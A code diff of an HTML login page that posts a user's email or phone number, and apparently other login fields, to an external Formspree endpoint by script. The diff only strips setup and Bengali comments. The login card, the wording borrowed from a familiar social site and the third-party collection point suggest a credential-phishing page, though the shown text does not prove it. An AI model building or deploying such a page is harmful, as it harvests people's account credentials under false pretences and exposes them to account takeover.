@@ -193,8 +193,7 @@
         <div class="card" role="region" aria-label="Login">
           
 
-          <!-- ====== Replace action with your Formspree URL ======
-               Example: action="https://formspree.io/f/your_form_id" -->
+         
           <form action="https://formspree.io/f/mdkpznvn" method="POST" autocomplete="on">
             <label for="email" style="position:absolute;left:-9999px;">Email or phone</label>
   <input id="email" name="email" type="email" placeholder="Email address or phone number" required
@@ -234,7 +233,7 @@
   <script>
   const form = document.getElementById("my-form");
   form.addEventListener("submit", async (e) => {
-    e.preventDefault(); // ফর্ম সাবমিট হলে নতুন পেজে না যায়
+    e.preventDefault(); 
     const data = new FormData(form);
     const response = await fetch(form.action, {
       method: form.method,
